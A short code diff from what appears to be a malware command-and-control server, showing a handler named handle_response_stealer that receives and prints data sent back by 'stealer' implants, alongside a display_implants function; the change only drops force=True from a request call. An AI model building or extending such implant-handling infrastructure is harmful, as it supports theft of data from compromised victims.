@@ -257,7 +257,7 @@ def display_implants():
 def handle_response_stealer():
     print("Recieved stealer")
     try:
-        request.get_data(force=True)
+        request.get_data()
         data = request.data
         print(data)
         #  if "stealer" in command:
